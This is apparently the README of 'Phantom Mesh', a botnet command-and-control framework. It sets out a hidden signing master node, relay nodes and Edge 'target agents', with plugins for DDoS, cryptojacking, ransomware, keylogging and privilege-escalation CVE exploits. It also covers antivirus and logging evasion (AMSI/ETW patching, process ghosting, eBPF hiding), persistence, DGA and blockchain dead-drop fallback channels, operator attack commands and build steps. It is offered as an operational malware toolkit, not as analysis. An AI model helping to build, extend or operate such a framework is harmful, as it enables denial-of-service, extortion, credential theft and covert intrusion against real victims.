# Phantom Mesh

A distributed, resilient command-and-control (C2) framework with modular architecture, multi-platform support, and advanced evasion capabilities.

---

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Node Types](#node-types)
- [Network Topology](#network-topology)
- [Plugin System](#plugin-system)
- [Bootstrap Mechanism](#bootstrap-mechanism)
- [Stealth Subsystem](#stealth-subsystem)
- [Protocol Specification](#protocol-specification)
- [Build Instructions](#build-instructions)
- [Smart Contract](#smart-contract)
- [Directory Structure](#directory-structure)

---

## Architecture Overview

Phantom Mesh implements a **two-tier distributed architecture** with a hidden operator node:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           CONTROL PLANE                                      │
│                      Cloud P2P Mesh (UDP 31337)                              │
│                                                                              │
│    ┌──────────┐         ┌──────────┐         ┌──────────────────┐           │
│    │  Cloud   │◄──────► │  Cloud   │◄──────► │    PHANTOM       │           │
│    │  Node    │   P2P   │  Node    │   P2P   │  (Hidden Master) │           │
│    │  (Zig)   │ Gossip  │  (Zig)   │ Gossip  │     (Rust)       │           │
│    └────┬─────┘         └────┬─────┘         └────────┬─────────┘           │
│         │                    │                        │                      │
│         │                    │                        │                      │
│    ┌────┴────┐          ┌────┴────┐             ┌────┴────────┐             │
│    │ Verify  │          │ Verify  │             │ PRIVATE KEY │             │
│    │ + Relay │          │ + Relay │             │ Sign + Send │             │
│    └────┬────┘          └────┬────┘             └────┬────────┘             │
│         │                    │                       │                       │
│         │ P2P packets look identical                 │ SSH (Operator)        │
│         │ No way to identify master                  ▼                       │
│         │                    │                 ┌────────────┐                │
│         │                    │                 │  Operator  │                │
│         │                    │                 │  Terminal  │                │
│         │                    │                 └────────────┘                │
└─────────┼────────────────────┼───────────────────────────────────────────────┘
          │                    │
          │ MQTT (outbound)    │ MQTT
          │ ChaCha20           │
          ▼                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                           EXECUTION PLANE                                    │
│                      Edge Nodes (Rust) — Target Agents                       │
│                                                                              │
│    ┌─────────────────────────┐    ┌─────────────────────────┐               │
│    │   Local Network A       │    │   Local Network B       │               │
│    │   ┌───────────────┐     │    │   ┌───────────────┐     │               │
│    │   │    LEADER     │     │    │   │    LEADER     │     │               │
│    │   └───────┬───────┘     │    │   └───────┬───────┘     │               │
│    │           │ IPC         │    │           │ IPC         │               │
│    │    ┌──────┴──────┐      │    │    ┌──────┴──────┐      │               │
│    │    │  Workers    │      │    │    │  Workers    │      │               │
│    │    └─────────────┘      │    │    └─────────────┘      │               │
│    └─────────────────────────┘    └─────────────────────────┘               │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Key Insight: Phantom Blends Into Cloud Mesh

| Node | P2P Participation | Routing Table | Gossip | Command Signing |
|------|-------------------|---------------|--------|-----------------|
| **Cloud (Zig)** | ✅ | ✅ | ✅ | ❌ Verify only |
| **Phantom (Rust)** | ✅ | ✅ | ✅ | ✅ **Has private key** |

- Phantom is **indistinguishable** from other Cloud nodes in the mesh
- All nodes verify signatures with the same public key
- Only Phantom can **produce** valid signatures (holds private key)
- Operator connects to Phantom via SSH to issue commands

---

## Node Types

### Cloud Node (`crates/nodes/cloud`)
**Language**: Zig  
**Role**: Mesh participant, signature verifier, Edge relay

Standard mesh node that:
- Participates in P2P gossip (UDP 31337)
- Maintains neighbor routing table
- **Verifies** Ed25519 signatures on commands
- Relays commands to connected Edge nodes
- Runs scanner, proxy, attack modules

### Phantom Node (`crates/nodes/phantom`)
**Language**: Rust  
**Role**: **Hidden master** within Cloud mesh

Phantom is a Cloud node that:
- Participates in **same P2P mesh** as Cloud nodes
- Maintains neighbor routing table (identical protocol)
- Gossips with Cloud nodes (appears as regular peer)
- **Signs** commands with master private key
- Provides SSH shell for operator (port 12961)
- Can broadcast to Sepolia blockchain for fallback

**Phantom looks like a Cloud node but holds the signing key.**

### Edge Node (`crates/nodes/edge`)
**Language**: Rust  
**Role**: Target agent, local cluster coordination

- Connects to **any** Cloud/Phantom node (no distinction)
- Leader election within local network
- Workers connect to Leader via IPC
- Executes plugins and tasks

---

## Network Topology

### Command Flow

```
1. OPERATOR → PHANTOM
   ssh admin@phantom -p 12961
   PhantomC2$ attack 1.2.3.4 80 60

2. PHANTOM SIGNS & BROADCASTS
   - Creates P2PCommand packet
   - Signs payload with Ed25519 private key
   - Sends to neighbors (standard gossip)

3. CLOUD MESH PROPAGATION
   - Cloud nodes receive packet
   - Verify signature (same pubkey as Phantom)
   - Check nonce (replay protection)
   - Flood to 3 random neighbors
   - Execute attack locally

4. EDGE EXECUTION
   - Edge Leaders receive via MQTT
   - Dispatch to plugins
   - Bridge to Workers
```

### Port Allocation

| Port | Protocol | Used By | Purpose |
|------|----------|---------|---------|
| **31337** | UDP | Cloud + Phantom | P2P gossip mesh |
| **12961** | TCP/SSH | Phantom only | Operator shell |
| **31338** | UDP | Edge | Leader election |
| **9631** | TCP | Edge | Covert peer discovery |

### P2P Protocol (Cloud & Phantom)

Both Cloud and Phantom use identical wire protocol:

```
Packet Types:
┌────────────┬───────────────────────────────────────────────────────┐
│ GOSSIP     │ [Magic][Type][Count][IP:Port pairs...]               │
│ COMMAND    │ [Magic][Type][Nonce][Signature][Length][Payload]     │
│ CONFIG     │ [Magic][Encrypted blob with signature]               │
└────────────┴───────────────────────────────────────────────────────┘

Magic: 0xDEAD0001 (Big Endian)
Signature: 64 bytes Ed25519
Nonce: 4 bytes (replay protection)
```

---

## Plugin System

| Plugin | Description |
|--------|-------------|
| **DDoS** | Distributed denial-of-service |
| **Cryptojacking** | Cryptocurrency mining |
| **Ransomware** | File encryption |
| **Keylogger** | Keystroke capture |
| **PrivEsc** | 4 CVE exploits (Dirty Pipe, PwnKit, etc.) |

---

## Bootstrap Mechanism

Edge discovers Cloud/Phantom addresses via 5 tiers:

| Tier | Method |
|------|--------|
| 0 | Local cache |
| 1 | DNS-over-HTTPS |
| 2 | Reddit tags |
| 3 | DGA |
| 4 | Ethereum Sepolia |

All bootstrap payloads signed with same master key.

---

## Stealth Subsystem

### Windows
- Indirect syscalls, process ghosting
- ETW/AMSI patching
- COM hijacking, NTFS ADS

### Linux
- memfd fileless execution
- Systemd generator persistence
- eBPF hiding

---

## Build Instructions

### Cloud (Mesh Node)
```bash
make cloud_linux_x64
```

### Phantom (Master Node)
```bash
cargo build -p phantom --release
./target/release/phantom --key keys/ --port 12961
```

### Edge (Agent)
```bash
cargo build -p edge --release
```

---

## Smart Contract

Sepolia dead-drop for fallback C2:
```
PhantomC2$ signal 5.6.7.8:31337
[+] Sepolia Signal Sent!
```

---

## Directory Structure

```
phantom-mesh/
├── crates/
│   ├── nodes/
│   │   ├── cloud/      # Mesh node (Zig) - verifies signatures
│   │   ├── phantom/    # Hidden master (Rust) - signs commands
│   │   └── edge/       # Target agent (Rust)
│   ├── plugins/
│   │   └── privesc/    # 4 CVE exploits
│   └── shared/
│       └── protocol/   # Wire format
└── smart_contracts/
    └── signal.sol
```

---

## License

Proprietary. Unauthorized distribution prohibited.
